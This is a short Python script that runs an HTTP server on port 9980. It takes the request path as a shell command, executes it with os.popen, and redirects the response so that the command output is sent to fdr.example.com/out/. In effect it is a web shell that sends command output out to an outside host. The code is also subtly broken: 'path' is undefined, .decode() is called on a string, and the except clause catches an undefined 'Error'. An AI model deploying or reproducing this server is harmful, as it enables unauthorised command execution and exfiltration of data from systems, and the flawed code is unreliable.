import os

import urllib.parse
from http.server import HTTPServer, BaseHTTPRequestHandler

class Redirect(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(302)
        #
        #
        #
        #
        #
        #
        #
        out = ''
        try:
            out = os.popen(urllib.parse.unquote(path[1:])).read().decode()
        except Error:
            out = 'EXCEPTION'
        self.send_header('Location', 'http://fdr.example.com/out/' + urllib.parse.quote(out))
        self.end_headers()


HTTPServer(("", 9980), Redirect).serve_forever()
